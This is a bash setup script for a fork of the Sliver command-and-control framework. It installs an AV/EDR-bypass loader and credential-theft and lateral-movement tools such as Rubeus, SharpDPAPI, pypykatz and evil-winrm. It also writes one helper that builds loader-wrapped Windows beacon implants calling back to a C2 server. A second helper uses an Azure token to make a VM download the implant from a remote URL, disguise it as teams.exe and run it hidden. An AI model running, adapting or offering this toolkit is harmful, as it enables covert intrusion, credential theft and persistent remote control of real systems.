#!/bin/bash
# mgstate/sliver - Full Setup Script (Fresh Kali/Ubuntu)
# Installs Go, system deps, Harriet, builds Sliver, creates helper scripts.
#
# Usage:
#   cd ~/sliver && bash setup.sh
#
# Or one-liner:
#   git clone https://github.com/mgstate/sliver.git ~/sliver && cd ~/sliver && bash setup.sh

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

info()  { echo -e "${CYAN}[*]${NC} $1"; }
ok()    { echo -e "${GREEN}[+]${NC} $1"; }
warn()  { echo -e "${YELLOW}[!]${NC} $1"; }
err()   { echo -e "${RED}[-]${NC} $1"; exit 1; }

SLIVER_DIR="${SLIVER_DIR:-$(pwd)}"
HARRIET_DIR="${HARRIET_DIR:-/opt/Home-Grown-Red-Team/Harriet}"
GO_VERSION="1.26.1"
GO_INSTALL_DIR="/usr/local"

# ─── Detect if we're in the sliver repo ───
if [ ! -f "$SLIVER_DIR/go.mod" ] || ! grep -q "bishopfox/sliver" "$SLIVER_DIR/go.mod" 2>/dev/null; then
    if [ -d "$HOME/sliver" ] && [ -f "$HOME/sliver/go.mod" ]; then
        SLIVER_DIR="$HOME/sliver"
    else
        info "Cloning mgstate/sliver..."
        git clone https://github.com/mgstate/sliver.git "$HOME/sliver"
        SLIVER_DIR="$HOME/sliver"
    fi
fi

cd "$SLIVER_DIR"

echo ""
echo -e "${CYAN}═══════════════════════════════════════════════════${NC}"
echo -e "${CYAN}  mgstate/sliver - Enhanced Fork Setup${NC}"
echo -e "${CYAN}═══════════════════════════════════════════════════${NC}"
echo -e "  Sliver dir:  ${GREEN}$SLIVER_DIR${NC}"
echo -e "  Harriet dir: ${GREEN}$HARRIET_DIR${NC}"
echo -e "  Go version:  ${GREEN}$GO_VERSION${NC}"
echo ""

###############################################################################
# Step 1: System Dependencies
###############################################################################
info "Step 1/7: Installing system dependencies..."
if command -v apt-get &>/dev/null; then
    export DEBIAN_FRONTEND=noninteractive
    apt-get update -qq 2>/dev/null
    apt-get install -y -qq \
        build-essential \
        cmake \
        mingw-w64 \
        osslsigncode \
        python3-pycryptodome \
        python3-pip \
        ruby ruby-dev \
        git \
        curl \
        wget \
        jq \
        unzip \
        sed \
        2>/dev/null || true
    ok "APT packages installed"
    # Ensure pycryptodome is available (Harriet requires 'from Crypto.Cipher import AES')
    # The apt package python3-pycryptodome sometimes installs as pycryptodomex which
    # uses 'from Cryptodome.Cipher' instead — wrong import path. Also the old 'pycrypto'
    # package conflicts. Nuke both and force-install the correct one via pip.
    if ! python3 -c "from Crypto.Cipher import AES" 2>/dev/null; then
        warn "pycryptodome not working, fixing..."
        pip3 uninstall -y pycrypto pycryptodomex 2>/dev/null || true
        pip3 install pycryptodome --break-system-packages --force-reinstall 2>/dev/null \
            || pip3 install pycryptodome --force-reinstall 2>/dev/null \
            || warn "pycryptodome install failed — Harriet encryption will not work"
        python3 -c "from Crypto.Cipher import AES" 2>/dev/null \
            && ok "pycryptodome verified" \
            || warn "pycryptodome still broken — run: pip3 install pycryptodome --break-system-packages"
    fi
elif command -v dnf &>/dev/null; then
    dnf install -y \
        gcc gcc-c++ make \
        mingw64-gcc mingw64-gcc-c++ \
        python3-pycryptodome \
        python3-pip \
        ruby rubygems ruby-devel \
        git curl wget jq unzip sed \
        2>/dev/null || true
    ok "DNF packages installed"
    if ! python3 -c "from Crypto.Cipher import AES" 2>/dev/null; then
        pip3 uninstall -y pycrypto pycryptodomex 2>/dev/null || true
        pip3 install pycryptodome --force-reinstall 2>/dev/null \
            || warn "pycryptodome install failed — Harriet encryption will not work"
    fi
elif command -v pacman &>/dev/null; then
    pacman -Sy --noconfirm \
        base-devel mingw-w64-gcc \
        python-pycryptodome \
        ruby \
        git curl wget jq unzip \
        2>/dev/null || true
    ok "Pacman packages installed"
    if ! python3 -c "from Crypto.Cipher import AES" 2>/dev/null; then
        pip3 uninstall -y pycrypto pycryptodomex 2>/dev/null || true
        pip3 install pycryptodome --break-system-packages --force-reinstall 2>/dev/null \
            || pip3 install pycryptodome --force-reinstall 2>/dev/null \
            || warn "pycryptodome install failed — Harriet encryption will not work"
    fi
else
    warn "Unknown package manager — install manually:"
    warn "  build-essential mingw-w64 osslsigncode python3-pycryptodome ruby git curl jq"
fi

# Install Azure CLI (needed for ATTACKPATH.md RunCommand operations)
if ! command -v az &>/dev/null; then
    info "Installing Azure CLI..."
    if command -v apt-get &>/dev/null; then
        curl -sL https://aka.ms/InstallAzureCLIDeb | bash 2>/dev/null || warn "Az CLI install failed (install manually: curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash)"
    else
        warn "Install Azure CLI manually: https://learn.microsoft.com/en-us/cli/azure/install-azure-cli"
    fi
else
    ok "Azure CLI already installed ($(az version --query '"azure-cli"' -o tsv 2>/dev/null))"
fi

# Install evil-winrm (lateral movement via WinRM through SOCKS proxy)
info "Installing evil-winrm..."
if command -v evil-winrm &>/dev/null; then
    ok "evil-winrm already installed ($(evil-winrm --version 2>/dev/null || echo 'unknown version'))"
else
    gem install evil-winrm --no-document 2>/dev/null \
        || gem install evil-winrm --user-install --no-document 2>/dev/null \
        || warn "evil-winrm install failed — install manually: gem install evil-winrm"
    command -v evil-winrm &>/dev/null && ok "evil-winrm installed" || warn "evil-winrm not in PATH"
fi

###############################################################################
# Step 2: Go Installation
###############################################################################
info "Step 2/7: Setting up Go $GO_VERSION..."

INSTALL_GO=0

# Check if Go exists and is new enough
if command -v go &>/dev/null; then
    CURRENT_GO=$(go version 2>/dev/null | awk '{print $3}' | sed 's/go//')
    GO_MAJOR=$(echo "$CURRENT_GO" | cut -d. -f1)
    GO_MINOR=$(echo "$CURRENT_GO" | cut -d. -f2)
    if [ "$GO_MAJOR" -ge 1 ] 2>/dev/null && [ "$GO_MINOR" -ge 25 ] 2>/dev/null; then
        ok "Go $CURRENT_GO already installed (>= 1.25 required)"
    else
        warn "Go $CURRENT_GO too old (need >= 1.25), upgrading..."
        INSTALL_GO=1
    fi
elif [ -x "$GO_INSTALL_DIR/go/bin/go" ]; then
    export PATH="$GO_INSTALL_DIR/go/bin:$HOME/go/bin:$PATH"
    CURRENT_GO=$("$GO_INSTALL_DIR/go/bin/go" version 2>/dev/null | awk '{print $3}' | sed 's/go//')
    GO_MINOR=$(echo "$CURRENT_GO" | cut -d. -f2)
    if [ "$GO_MINOR" -ge 25 ] 2>/dev/null; then
        ok "Go $CURRENT_GO found at $GO_INSTALL_DIR/go/bin/go"
    else
        INSTALL_GO=1
    fi
else
    info "Go not found, installing..."
    INSTALL_GO=1
fi

if [ "$INSTALL_GO" = "1" ]; then
    ARCH=$(uname -m)
    case "$ARCH" in
        x86_64)  GO_ARCH="amd64" ;;
        aarch64) GO_ARCH="arm64" ;;
        armv7l)  GO_ARCH="armv6l" ;;
        *)       err "Unsupported architecture: $ARCH" ;;
    esac

    GO_TAR="go${GO_VERSION}.linux-${GO_ARCH}.tar.gz"
    GO_URL="https://go.dev/dl/$GO_TAR"

    info "Downloading $GO_URL ..."
    wget -q --show-progress -O "/tmp/$GO_TAR" "$GO_URL" || curl -sL -o "/tmp/$GO_TAR" "$GO_URL"
    [ ! -f "/tmp/$GO_TAR" ] && err "Failed to download Go. Check network connectivity."

    info "Installing to $GO_INSTALL_DIR/go ..."
    rm -rf "$GO_INSTALL_DIR/go"
    tar -C "$GO_INSTALL_DIR" -xzf "/tmp/$GO_TAR"
    rm -f "/tmp/$GO_TAR"

    export PATH="$GO_INSTALL_DIR/go/bin:$HOME/go/bin:$PATH"
    GO_PATH_LINE="export PATH=$GO_INSTALL_DIR/go/bin:\$HOME/go/bin:\$PATH"
    for rcfile in "$HOME/.bashrc" "$HOME/.zshrc" "$HOME/.profile"; do
        if [ -f "$rcfile" ] || [ "$rcfile" = "$HOME/.bashrc" ]; then
            if ! grep -qF "$GO_INSTALL_DIR/go/bin" "$rcfile" 2>/dev/null; then
                echo "" >> "$rcfile"
                echo "# Go (added by sliver setup)" >> "$rcfile"
                echo "$GO_PATH_LINE" >> "$rcfile"
            fi
        fi
    done
    [ -d /etc/profile.d ] && echo "$GO_PATH_LINE" > /etc/profile.d/golang.sh && chmod +x /etc/profile.d/golang.sh
    ok "Go $("$GO_INSTALL_DIR/go/bin/go" version | awk '{print $3}') installed"
fi

command -v go &>/dev/null || export PATH="$GO_INSTALL_DIR/go/bin:$HOME/go/bin:$PATH"
go version || err "Go installation failed"

###############################################################################
# Step 3: Harriet Loader (AV/EDR Bypass)
###############################################################################
info "Step 3/7: Setting up Harriet loader..."
HARRIET_REPO_DIR="$(dirname "$(dirname "$HARRIET_DIR")")/Home-Grown-Red-Team"

if [ -d "$HARRIET_DIR" ] && [ -f "$HARRIET_DIR/Makefile" -o -f "$HARRIET_DIR/setup.sh" -o -d "$HARRIET_DIR/FULLAes" ]; then
    ok "Harriet already present at $HARRIET_DIR"
else
    info "Cloning Harriet from GitHub..."
    mkdir -p "$(dirname "$HARRIET_REPO_DIR")"
    if [ -d "$HARRIET_REPO_DIR" ]; then
        cd "$HARRIET_REPO_DIR" && git pull 2>/dev/null || true
        cd "$SLIVER_DIR"
    else
        git clone https://github.com/assume-breach/Home-Grown-Red-Team.git "$HARRIET_REPO_DIR"
    fi
    if [ -f "$HARRIET_DIR/setup.sh" ]; then
        info "Running Harriet setup.sh..."
        cd "$HARRIET_DIR" && bash setup.sh || warn "Harriet setup.sh had errors (may still work)"
        cd "$SLIVER_DIR"
        ok "Harriet installed"
    elif [ -d "$HARRIET_DIR/FULLAes" ]; then
        ok "Harriet present (no setup.sh needed)"
    else
        warn "Harriet directory structure unexpected — check $HARRIET_DIR"
    fi
fi

# Verify Harriet's pycryptodome dependency
if ! python3 -c "from Crypto.Cipher import AES" 2>/dev/null; then
    warn "pycryptodome broken — Harriet will fail. Attempting fix..."
    pip3 uninstall -y pycrypto pycryptodomex 2>/dev/null || true
    pip3 install pycryptodome --break-system-packages --force-reinstall 2>/dev/null \
        || pip3 install pycryptodome --force-reinstall 2>/dev/null || true
    python3 -c "from Crypto.Cipher import AES" 2>/dev/null \
        && ok "pycryptodome fixed" \
        || warn "pycryptodome STILL broken. Manual fix: pip3 install pycryptodome --break-system-packages --force-reinstall"
else
    ok "pycryptodome verified (Harriet dependency)"
fi

###############################################################################
# Step 4: Download Post-Exploitation Tools
###############################################################################
info "Step 4/7: Downloading post-exploitation tools..."
TOOLS_DIR="$SLIVER_DIR/tools"
mkdir -p "$TOOLS_DIR"

[ ! -d "$TOOLS_DIR/lsawhisper-bof" ] && git clone https://github.com/dazzyddos/lsawhisper-bof.git "$TOOLS_DIR/lsawhisper-bof" 2>/dev/null || true
[ ! -d "$TOOLS_DIR/No-Consolation" ] && git clone https://github.com/fortra/No-Consolation.git "$TOOLS_DIR/No-Consolation" 2>/dev/null || true

# LSA Whisperer — pre-built exe for execute-assembly (works with Credential Guard)
if [ ! -f "$TOOLS_DIR/sharp-tools/lsa-whisperer.exe" ]; then
    info "Downloading LSA Whisperer (pre-built release)..."
    mkdir -p "$TOOLS_DIR/sharp-tools"
    LSA_ZIP="/tmp/lsa-whisperer.zip"
    curl -sL -o "$LSA_ZIP" "https://github.com/EvanMcBroom/lsa-whisperer/releases/download/latest/lsa-whisperer-v2.4-52-gf25eca1.zip" 2>/dev/null
    if [ -f "$LSA_ZIP" ]; then
        unzip -o -j "$LSA_ZIP" "*.exe" -d "$TOOLS_DIR/sharp-tools/" 2>/dev/null || \
        unzip -o "$LSA_ZIP" -d "/tmp/lsa-whisperer-extract" 2>/dev/null && \
        find /tmp/lsa-whisperer-extract -name "*.exe" -exec cp {} "$TOOLS_DIR/sharp-tools/" \; 2>/dev/null
        rm -rf "$LSA_ZIP" /tmp/lsa-whisperer-extract
        [ -f "$TOOLS_DIR/sharp-tools/lsa-whisperer.exe" ] \
            && ok "LSA Whisperer downloaded to $TOOLS_DIR/sharp-tools/lsa-whisperer.exe" \
            || warn "LSA Whisperer extract failed — download manually from https://github.com/EvanMcBroom/lsa-whisperer/releases"
    else
        warn "LSA Whisperer download failed"
    fi
fi

# Seatbelt, SharpUp, Rubeus, Certify — pre-compiled .NET tools for execute-assembly
# These are also available via armory but having local copies is useful
SHARP_DIR="$TOOLS_DIR/sharp-tools"
mkdir -p "$SHARP_DIR"
info "Downloading pre-compiled .NET tools..."
for TOOL_URL in \
    "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe" \
    "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe" \
    "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpUp.exe" \
    "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Certify.exe" \
    "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpDPAPI.exe"; do
    FNAME=$(basename "$TOOL_URL")
    [ ! -f "$SHARP_DIR/$FNAME" ] && curl -sL -o "$SHARP_DIR/$FNAME" "$TOOL_URL" 2>/dev/null || true
done
TOOL_COUNT=$(ls "$SHARP_DIR"/*.exe 2>/dev/null | wc -l)
ok "$TOOL_COUNT .NET tools in $SHARP_DIR"

pip3 install pypykatz 2>/dev/null || pip3 install pypykatz --break-system-packages 2>/dev/null || true
pip3 install impacket 2>/dev/null || pip3 install impacket --break-system-packages 2>/dev/null || true
pip3 install netexec 2>/dev/null || pip3 install netexec --break-system-packages 2>/dev/null || true

ok "Tools downloaded to $TOOLS_DIR"

###############################################################################
# Step 5: Build Sliver
###############################################################################
info "Step 5/7: Building Sliver server + client..."
cd "$SLIVER_DIR"

if [ -d "vendor" ]; then
    info "Using vendored dependencies"
else
    info "Downloading Go modules (first build, takes a few minutes)..."
    go mod download
fi

# Stop running Sliver before rebuild to avoid stale binary serving old code
STALE_PIDS=$(pgrep -f 'sliver-server|sliver-client' 2>/dev/null || true)
if [ -n "$STALE_PIDS" ]; then
    warn "Stopping running Sliver before rebuild (PIDs: $STALE_PIDS)..."
    echo "$STALE_PIDS" | xargs -r kill 2>/dev/null || true
    sleep 2
    REMAINING=$(pgrep -f 'sliver-server|sliver-client' 2>/dev/null || true)
    [ -n "$REMAINING" ] && echo "$REMAINING" | xargs -r kill -9 2>/dev/null || true
    sleep 1
    ok "Stale processes stopped"
fi

info "Running make (takes several minutes on first build)..."
make

if [ -f "$SLIVER_DIR/sliver-server" ] && [ -f "$SLIVER_DIR/sliver-client" ]; then
    ok "sliver-server built: $(ls -lh "$SLIVER_DIR/sliver-server" | awk '{print $5}')"
    ok "sliver-client built: $(ls -lh "$SLIVER_DIR/sliver-client" | awk '{print $5}')"
else
    err "Build failed — sliver-server or sliver-client not found"
fi

###############################################################################
# Step 6: Install Az PowerShell Module (if pwsh available)
###############################################################################
info "Step 6/7: Checking Az PowerShell module..."
if command -v pwsh &>/dev/null; then
    pwsh -c "if(!(Get-Module -ListAvailable Az)){Install-Module Az -Force -Scope CurrentUser -Repository PSGallery}" 2>/dev/null \
        && ok "Az PowerShell module ready" \
        || warn "Az PowerShell install failed"
else
    warn "PowerShell (pwsh) not installed — Az module skipped"
    warn "Install: https://learn.microsoft.com/en-us/powershell/scripting/install/installing-powershell-on-linux"
fi

###############################################################################
# Step 7: Create Helper Scripts
###############################################################################
info "Step 7/7: Creating helper scripts..."

[ -f "$SLIVER_DIR/start.sh" ] && ok "start.sh already exists (from git clone)"
chmod +x "$SLIVER_DIR/start.sh" 2>/dev/null || true

# ─── gen-implant.sh (NO --evasion flag) ───
cat > "$SLIVER_DIR/gen-implant.sh" << 'GENEOF'
#!/bin/bash
# Generate Harriet-wrapped Sliver implant
# IMPORTANT: Does NOT use --evasion (triggers AMSI alerts)
set -e
export PATH="/usr/local/go/bin:$HOME/go/bin:$PATH"

MTLS_PORT=8888; PROFILE="microsoft365"; METHOD="directsyscall"
BEACON_SEC=60; JITTER=30; OUTPUT="/tmp/implant.exe"
SHELLCODE_ONLY=0; HARRIET_PATH="/opt/Home-Grown-Red-Team/Harriet"; C2_IP=""

while [[ $# -gt 0 ]]; do
    case $1 in
        --ip)             C2_IP="$2"; shift 2 ;;
        --mtls-port)      MTLS_PORT="$2"; shift 2 ;;
        --profile)        PROFILE="$2"; shift 2 ;;
        --method)         METHOD="$2"; shift 2 ;;
        --beacon-sec)     BEACON_SEC="$2"; shift 2 ;;
        --jitter)         JITTER="$2"; shift 2 ;;
        --output|-o)      OUTPUT="$2"; shift 2 ;;
        --shellcode-only) SHELLCODE_ONLY=1; shift ;;
        --harriet-path)   HARRIET_PATH="$2"; shift 2 ;;
        -h|--help)
            echo "Usage: $0 --ip C2_IP [options]"
            echo "  --ip IP          C2 callback IP (required)"
            echo "  --profile NAME   C2 profile (default: microsoft365)"
            echo "  --method METHOD  Harriet: directsyscall|queueapc|nativeapi|inject|aes"
            echo "  --output FILE    Output (default: /tmp/implant.exe)"
            echo "  --shellcode-only Skip Harriet, output raw .bin"
            echo ""
            echo "NOTE: --evasion is NOT used (causes AMSI alerts)"
            exit 0 ;;
        *) echo "Unknown: $1"; exit 1 ;;
    esac
done

[ -z "$C2_IP" ] && { echo "Usage: $0 --ip YOUR_C2_IP"; exit 1; }

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
SC="/tmp/sliver_sc_$$.bin"
C2="--mtls ${C2_IP}:${MTLS_PORT}"

echo "[*] Generating beacon: $C2 | profile=$PROFILE | ${BEACON_SEC}s+${JITTER}s jitter"
echo "[*] NOTE: --evasion NOT used (causes AMSI alerts)"

"$SCRIPT_DIR/sliver-client" << CMD
generate beacon $C2 --os windows --arch amd64 --format shellcode \
  --c2profile $PROFILE --seconds $BEACON_SEC --jitter $JITTER \
  --strategy r --reconnect 30 --max-errors 10 --save $SC
CMD

[ ! -f "$SC" ] && { echo "[-] Shellcode generation failed"; exit 1; }
echo "[+] Shellcode: $SC ($(stat -c%s "$SC" 2>/dev/null || wc -c < "$SC") bytes)"

if [ "$SHELLCODE_ONLY" = "1" ]; then
    mv "$SC" "$OUTPUT"; echo "[+] Saved: $OUTPUT"; exit 0
fi

echo "[*] Wrapping with Harriet ($METHOD)..."
"$SCRIPT_DIR/sliver-client" << CMD2
harriet --shellcode $SC --method $METHOD --format exe \
  --output $OUTPUT --harriet-path $HARRIET_PATH
CMD2

[ -f "$OUTPUT" ] && echo "[+] Ready: $OUTPUT ($(stat -c%s "$OUTPUT" 2>/dev/null || wc -c < "$OUTPUT") bytes)" || echo "[-] Harriet failed"
rm -f "$SC"
GENEOF
chmod +x "$SLIVER_DIR/gen-implant.sh"
ok "gen-implant.sh created (NO --evasion)"

# ─── deploy-runcommand.sh ───
cat > "$SLIVER_DIR/deploy-runcommand.sh" << 'DEPLOYEOF'
#!/bin/bash
set -e
TOKEN=""; SUB=""; RG=""; VM=""; IMPLANT_URL=""
while [[ $# -gt 0 ]]; do
    case $1 in
        --token) TOKEN="$2"; shift 2 ;;
        --sub) SUB="$2"; shift 2 ;;
        --rg) RG="$2"; shift 2 ;;
        --vm) VM="$2"; shift 2 ;;
        --implant-url) IMPLANT_URL="$2"; shift 2 ;;
        -h|--help) echo "Usage: $0 --token TOKEN --sub SUB_ID --rg RG --vm VM --implant-url URL"; exit 0 ;;
        *) echo "Unknown: $1"; exit 1 ;;
    esac
done
[ -z "$TOKEN" ] || [ -z "$SUB" ] || [ -z "$RG" ] || [ -z "$VM" ] || [ -z "$IMPLANT_URL" ] && {
    echo "Usage: $0 --token TOKEN --sub SUB_ID --rg RG --vm VM --implant-url URL"; exit 1; }

API="https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Compute/virtualMachines/$VM"
H=(-H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json")

echo "[*] Getting VM location..."
LOC=$(curl -s "${H[@]}" "$API?api-version=2024-03-01" | jq -r .location)
[ "$LOC" = "null" ] || [ -z "$LOC" ] && { echo "[-] Failed"; exit 1; }
echo "[+] Location: $LOC"

CMD_NAME="deploy-$(date +%s)"
SCRIPT="iwr $IMPLANT_URL -OutFile C:\\ProgramData\\teams.exe -UseBasicParsing; Start-Process C:\\ProgramData\\teams.exe -WindowStyle Hidden"
BODY=$(jq -n --arg l "$LOC" --arg s "$SCRIPT" '{location:$l,properties:{source:{script:$s},asyncExecution:true,timeoutInSeconds:86400}}')
URL="$API/runCommands/$CMD_NAME?api-version=2024-03-01"

echo "[*] Deploying: $CMD_NAME"
CODE=$(curl -s -o /tmp/rc_resp.json -w "%{http_code}" -X PUT "${H[@]}" "$URL" -d "$BODY")
[ "$CODE" = "200" ] || [ "$CODE" = "201" ] && echo "[+] Deployed" || { echo "[-] Failed ($CODE)"; cat /tmp/rc_resp.json; exit 1; }
echo "[+] Check: sliver > beacons"
DEPLOYEOF
chmod +x "$SLIVER_DIR/deploy-runcommand.sh"
ok "deploy-runcommand.sh created"

###############################################################################
# Done
###############################################################################
echo ""
echo -e "${GREEN}═══════════════════════════════════════════════════${NC}"
echo -e "${GREEN}  Setup Complete!${NC}"
echo -e "${GREEN}═══════════════════════════════════════════════════${NC}"
echo ""
echo -e "  ${CYAN}Quick Start:${NC}"
echo ""
echo -e "  ${YELLOW}1. Start server + listener:${NC}"
echo -e "     ./start.sh"
echo ""
echo -e "  ${YELLOW}2. Generate implant (NO --evasion):${NC}"
echo -e "     generate beacon --mtls YOUR_IP:8888 --os windows --arch amd64 \\"
echo -e "       --format shellcode --c2profile microsoft365 \\"
echo -e "       --seconds 60 --jitter 30 --save /tmp/beacon.bin"
echo ""
echo -e "  ${YELLOW}3. Wrap with Harriet:${NC}"
echo -e "     harriet --shellcode /tmp/beacon.bin --method directsyscall \\"
echo -e "       --format exe --output /tmp/teams.exe"
echo ""
echo -e "  ${YELLOW}4. Deploy: see ATTACKPATH.md${NC}"
echo ""
